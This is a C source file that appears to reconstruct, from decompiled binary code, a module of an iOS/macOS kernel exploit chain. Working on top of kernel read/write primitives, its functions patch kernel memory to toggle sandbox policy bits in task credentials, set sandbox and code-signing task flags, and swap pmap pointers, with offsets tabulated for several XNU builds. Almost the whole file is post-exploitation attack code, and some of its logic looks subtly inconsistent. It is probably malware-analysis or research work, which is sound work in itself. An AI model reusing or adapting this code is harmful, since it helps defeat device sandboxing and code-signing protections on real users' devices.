/*
 * record_0x90000_policy.c
 * entry5_type0x09.dylib — AMFI / sandbox / task policy patching
 *
 * sub_3bec4  — swap pmap pointer in IOSurface kernel object
 * sub_3c034  — set/clear sandbox policy bit (bit 10) in task credential
 * sub_3c354  — set task flag bytes (0x4000001B payload) + dyld gate
 * sub_3ca24  — query task flag bytes (0xC000001B readback) → 3 booleans
 * sub_3c97c  — dyld-version-gated helper: set/clear bit 0x80 in task flags
 *
 * Verified: selector constants, flag bit positions, kaddr thresholds,
 *           xnu build switch values, kread/kwrite call patterns.
 * Inferred: "policy patching" / "task flag" labels from call context.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>

/* ── kaddr thresholds ────────────────────────────────────────────────────── */
#define KADDR_OLD_MAX   0x1C1B0A80100000ULL
#define KADDR_MID_MIN   0x1F530000000000ULL
#define KADDR_MID_MAX   0x1F52FFFFFFFFFFFFULL
#define KADDR_NEW_MIN   0x1F530F02800000ULL

/* ── xnu build constants ─────────────────────────────────────────────────── */
#define XNU_1809  0x1809
#define XNU_1C1B  0x1c1b
#define XNU_1F53  0x1f53
#define XNU_1F54  0x1f54
#define XNU_2258  0x2258
#define XNU_225C  0x225c
#define XNU_2712  0x2712

/* ── capability / flag bits ──────────────────────────────────────────────── */
#define CAP_PMAP_SWAP   0x20
#define CAP_SANDBOX     0x5184001
#define CAP_TASK_FLAG   0x5584001
#define CAP_IOGPU       0x80000
#define CAP_IOGPU2      0x1180000
#define CAP_DYLD_GATE   437000000.0   /* DAT_000437d0 */

/* ── state field offsets (byte) ──────────────────────────────────────────── */
#define OFF_FLAGS       0
#define OFF_XNU_MAJOR   (0x140 * 4)
#define OFF_KADDR       (0x56  * 4)
#define OFF_KOBJ_CACHE  (0x128 * 4)   /* cached kobj ptr for sandbox path    */
#define OFF_STRIDE      (0x168 * 4)   /* version-dependent struct stride      */
#define OFF_SANDBOX_CTX (0x1d30 - 0)  /* cached sandbox helper ctx           */

/* ── forward declarations ────────────────────────────────────────────────── */
extern int  sub_37238(long state, uint32_t flag);   /* test capability bit   */
extern long sub_35858(long state, uint64_t task);   /* task → kernel obj     */
extern long sub_1ad70(long state, uint64_t addr);   /* validate kaddr        */
extern int  sub_29ab4(long state, uint64_t addr, uint64_t *out); /* kread64  */
extern int  sub_2667c(long state, uint64_t addr, int size, void *out); /* kread */
extern int  sub_15634(long state, uint64_t addr, void *val, int size); /* kwrite */
extern int  sub_16108(long state, uint64_t addr, void *val, int size); /* kwrite byte */
extern int  sub_2b614(long state, uint64_t addr, void *val, int size); /* kwrite raw */
extern int  sub_2f934(long state, uint64_t task, uint64_t param4, uint64_t param5);
extern long sub_35508(void);                        /* get dyld info base    */
extern int  sub_2a90c(long state, uint64_t addr, uint32_t *out); /* kread32  */
extern int  sub_2bb24(long state, uint64_t addr, ...);           /* kwrite32 */

/* ── version-dependent struct offset for task flags ─────────────────────── */
static long task_flag_offset(long state)
{
    int xnu = *(int *)((uint8_t *)state + OFF_XNU_MAJOR);
    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
    int has_iogpu2 = sub_37238(state, CAP_IOGPU2);

    if (xnu >= XNU_2712) return has_iogpu2 ? 0xbf : 0xc7;
    if (xnu >= XNU_2258) {
        int has_iogpu = sub_37238(state, CAP_IOGPU2);
        return has_iogpu ? 0xb7 : 0xbf;
    }
    if (xnu >= XNU_1F53) return 0x97;
    if (xnu >= XNU_1C1B) return 0xdf;
    if (xnu >= XNU_1809) return kaddr < 0x18090A07900000ULL ? 0xef : 0xe7;
    return -1;
}

/* ── sub_3bec4 — swap pmap pointer in IOSurface kernel object ───────────── */
/*
 * When capability bit 0x20 is set and the task has a valid kernel object,
 * compares the pmap pointer at kobj+0x50 against the cached value at
 * state+0x128. If they differ, picks the smaller of the two pointers
 * (from kobj+0x28 vs cached+0x28/0x30) and writes it back.
 */
void sub_3bec4(long state, uint64_t task)
{
    if (!sub_37238(state, CAP_PMAP_SWAP)) return;

    long kobj = sub_35858(state, task);
    if (!kobj) return;

    uint64_t pmap_ptr = 0;
    if (!sub_29ab4(state, kobj + 0xb0, &pmap_ptr)) return;
    if (!sub_1ad70(state, pmap_ptr)) return;

    uint64_t cur_pmap = 0;
    if (!sub_29ab4(state, pmap_ptr + 0x50, &cur_pmap)) return;
    if (!cur_pmap) return;

    long cached = *(long *)((uint8_t *)state + OFF_KOBJ_CACHE);
    if (!cached || cur_pmap == (uint64_t)cached) return;

    uint64_t a = 0, b = 0, c = 0, d = 0;
    if (!sub_2667c(state, cached + 0x28, 8, &a)) return;
    if (!sub_2667c(state, cached + 0x30, 8, &b)) return;
    if (!sub_2667c(state, cur_pmap + 0x28, 8, &c)) return;
    if (!sub_2667c(state, cur_pmap + 0x30, 8, &d)) return;

    uint64_t *src = &c;
    uint64_t dst_off = cur_pmap + 0x28;
    if (a < c) {
        src = &a;
        dst_off = cur_pmap + 0x28;
    } else {
        dst_off = cur_pmap + 0x30;
    }
    sub_15634(state, dst_off, src, 8);
}

/* ── sub_3c97c — dyld-gated bit-0x80 toggle ─────────────────────────────── */
static void sub_3c97c(long state, uint64_t task, int enable)
{
    long base = sub_35508();
    if (!base) return;
    uint32_t flags = 0;
    if (!sub_2a90c(state, base, &flags)) return;
    uint32_t want = enable ? (flags | 0x80) : (flags & ~0x80u);
    if (want != flags)
        sub_2bb24(state, base, want);
}

/* ── sub_3c034 — set/clear sandbox policy bit in task credential ─────────── */
/*
 * Selector 13 (param_3=0 → clear, param_3!=0 → set).
 * Reads the version-dependent task credential field and toggles bit 10.
 * On the 0x20-capability path: uses the cached kobj at state+0x128.
 * On the 0x5184001 path: walks task → kobj → +0xb0 → +0x50 chain.
 */
void sub_3c034(long state, uint64_t task, int enable)
{
    if (!sub_2667c(state, 0, 0, NULL)) return;  /* dummy: check kread works */

    int xnu = *(int *)((uint8_t *)state + OFF_XNU_MAJOR);
    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);

    /* version-dependent credential field offset */
    long cred_off;
    if (xnu >= XNU_1F54) {
        if (xnu == XNU_1F54) { cred_off = 0x94; goto do_patch; }
        if (xnu < XNU_225C)  { if (xnu != XNU_2258) return; }
        cred_off = (xnu == XNU_225C || xnu == XNU_2258) ? 0xb4 : 0;
        if (xnu == XNU_2712) { cred_off = 200; goto do_patch; }
        if (!cred_off) return;
        goto do_patch;
    }
    if (xnu == XNU_1F53) { cred_off = 0x11c; goto do_patch; }
    if (xnu == XNU_1C1B || xnu == XNU_1809) {
        cred_off = (xnu == XNU_1809) ? 200 : 0xb8;
        goto do_patch;
    }
    return;

do_patch:;
    long kobj = 0;

    if (sub_37238(state, CAP_PMAP_SWAP)) {
        /* path: use cached kobj */
        uint64_t pmap_ptr = 0;
        long cached_kobj = sub_35858(state, task);
        if (!cached_kobj) return;
        if (!sub_29ab4(state, cached_kobj + 0xb0, &pmap_ptr)) return;
        if (!sub_1ad70(state, pmap_ptr)) return;
        uint64_t cred_kobj = 0;
        if (!sub_29ab4(state, pmap_ptr + 0x50, &cred_kobj)) return;
        if (!cred_kobj) return;
        *(long *)((uint8_t *)state + OFF_KOBJ_CACHE) = (long)cred_kobj;
        uint64_t dummy = 0;
        sub_15634(state, pmap_ptr + 0x50, &dummy, *(int *)((uint8_t *)state + OFF_STRIDE));
        kobj = (long)cred_kobj;
    } else if (sub_37238(state, CAP_SANDBOX)) {
        /* path: walk task → kobj */
        long tkobj = sub_35858(state, task);
        if (!tkobj) return;

        long field_off;
        if (xnu >= XNU_2712) {
            int has = sub_37238(state, CAP_IOGPU2);
            field_off = has ? 0xa0 : 0xa8;
        } else if (xnu >= XNU_2258) {
            int has = sub_37238(state, CAP_IOGPU2);
            field_off = has ? 0x98 : 0xa0;
        } else if (xnu >= XNU_1F53) {
            field_off = 0xe0;
        } else if (xnu >= XNU_1C1B) {
            int has = sub_37238(state, CAP_IOGPU);
            field_off = has ? 0xd8 : 0xe0;
        } else {
            field_off = kaddr < 0x18090A07900000ULL ? 0xf0 : 0xe8;
        }

        uint64_t cred_ptr = 0;
        if (!sub_2667c(state, field_off + tkobj, 8, &cred_ptr)) return;
        if (!cred_ptr) return;
        if (*(uintptr_t *)((uint8_t *)state + OFF_KOBJ_CACHE) == 0)
            *(uint64_t *)((uint8_t *)state + OFF_KOBJ_CACHE) = cred_ptr;
        uint64_t zero = 0;
        sub_15634(state, field_off + tkobj, &zero, 8);
        sub_15634(state, field_off + tkobj + 8, &zero, 8);
        kobj = (long)cred_ptr;
    } else {
        return;
    }

    /* read current flags and toggle bit 10 */
    uint32_t flags = 0;
    if (!sub_2667c(state, kobj + cred_off, 4, &flags)) return;
    uint32_t new_flags = (flags & 0xfffff800u) | (flags & 0x3ffu) |
                         ((uint32_t)(enable != 0) << 10);
    sub_2b614(state, kobj + cred_off, &new_flags, 4);
}

/* ── sub_3c354 — set task flag bytes (0x4000001B) ───────────────────────── */
/*
 * param_3 = flag_04 (sandbox enable)
 * param_4 = flag_05 (code-sign enable)
 * param_5 = flag_06 (dyld flag)
 *
 * Reads the version-dependent 4-byte task flag word, merges the three
 * flag bytes into it, and writes back. Then calls sub_2f934 on older
 * kernels, and sub_3c97c if dyldVersionNumber >= CAP_DYLD_GATE.
 */
void sub_3c354(long state, uint64_t task,
               uint32_t flag_04, uint64_t flag_05, uint64_t flag_06)
{
    long kobj = sub_35858(state, task);
    if (!kobj) return;

    int has_pmap = sub_37238(state, CAP_PMAP_SWAP);
    int has_sand = sub_37238(state, CAP_SANDBOX);

    if (!has_pmap && !has_sand) {
        /* simple 1-byte path (capability 0x200) */
        int xnu = *(int *)((uint8_t *)state + OFF_XNU_MAJOR);
        uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
        long off;
        if (xnu >= XNU_2258) off = 0x8f;
        else if (xnu >= XNU_1F53) off = 0x97;
        else if (xnu >= XNU_1C1B) off = 0xdf;
        else if (xnu >= XNU_1809) off = kaddr < 0x18090A07900000ULL ? 0xef : 0xe7;
        else return;

        uint8_t cur = 0;
        if (!sub_2667c(state, off + kobj, 1, &cur)) return;
        uint8_t want = (uint8_t)flag_06;
        if (cur != want)
            sub_2b614(state, off + kobj, &want, 1);
        return;
    }

    long flag_off = task_flag_offset(state);
    if (flag_off < 0) return;

    uint32_t cur = 0;
    if (!sub_2667c(state, flag_off + kobj, 4, &cur)) return;

    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
    uint32_t mask_hi, bit_hi, bit_lo;
    if (kaddr < KADDR_OLD_MAX) {
        mask_hi = 0xff000000u; bit_hi = 0x10000u; bit_lo = 0x100u;
    } else {
        mask_hi = 0xff00u;     bit_hi = 0x1000000u; bit_lo = 0x10000u;
    }

    uint32_t new_flags = (flag_06 ? bit_hi : 0) |
                         (flag_04 ? bit_lo : 0) |
                         (uint32_t)flag_05 |
                         (cur & mask_hi);

    if (cur != new_flags) {
        if (!sub_15634(state, flag_off + kobj, &new_flags, 4)) return;
    }

    /* older kernels: additional task-port operation */
    int xnu = *(int *)((uint8_t *)state + OFF_XNU_MAJOR);
    if (kaddr <= KADDR_MID_MAX)
        sub_2f934(state, task, flag_05 | (flag_04 ^ 1), flag_06);

    /* dyld-version gate */
    extern double dyldVersionNumber;
    if (dyldVersionNumber >= CAP_DYLD_GATE)
        sub_3c97c(state, task, (int)flag_06);

    (void)xnu;
}

/* ── sub_3ca24 — query task flag bytes (0xC000001B readback) ────────────── */
/*
 * Reads the same flag word written by sub_3c354 and returns three booleans:
 *   *out_flag04 — sandbox enable bit
 *   *out_flag05 — code-sign enable bit
 *   *out_flag06 — dyld flag bit
 */
void sub_3ca24(long state, uint64_t task,
               uint8_t *out_flag04, uint8_t *out_flag05, uint8_t *out_flag06)
{
    *out_flag04 = *out_flag05 = *out_flag06 = 0;

    long kobj = sub_35858(state, task);
    if (!kobj) return;

    int has_pmap = sub_37238(state, CAP_PMAP_SWAP);

    if (has_pmap) {
        /* newest path: read from kobj+0xb0 → +0x50 */
        uint64_t pmap_ptr = 0;
        if (!sub_29ab4(state, kobj + 0xb0, &pmap_ptr)) return;
        if (!sub_1ad70(state, pmap_ptr)) return;
        uint8_t byte = 0;
        if (!sub_2667c(state, pmap_ptr + 0x20, 1, &byte)) return;
        *out_flag06 = 0;
        *out_flag04 = 1;
        return;
    }

    if (!sub_37238(state, CAP_SANDBOX)) {
        /* simple 1-byte path */
        int xnu = *(int *)((uint8_t *)state + OFF_XNU_MAJOR);
        uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
        long off;
        if (xnu >= XNU_2258) off = 0x8f;
        else if (xnu >= XNU_1F53) off = 0x97;
        else if (xnu >= XNU_1C1B) off = 0xdf;
        else if (xnu >= XNU_1809) off = kaddr < 0x18090A07900000ULL ? 0xef : 0xe7;
        else return;

        uint32_t val = 0;
        if (!sub_2667c(state, off + kobj, 1, &val)) return;
        *out_flag04 = 0;
        *out_flag05 = 0;
        return;
    }

    long flag_off = task_flag_offset(state);
    if (flag_off < 0) return;

    uint32_t flags = 0;
    if (!sub_2a90c(state, flag_off + kobj, &flags)) return;

    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
    *out_flag06 = (flags & 0xff) != 0;
    if (kaddr < KADDR_OLD_MAX) {
        *out_flag04 = (flags & 0xff00) != 0;
        *out_flag05 = (flags & 0xff0000) != 0;
    } else {
        *out_flag04 = (flags & 0xff0000) != 0;
        *out_flag05 = (flags >> 24) != 0;
    }
}
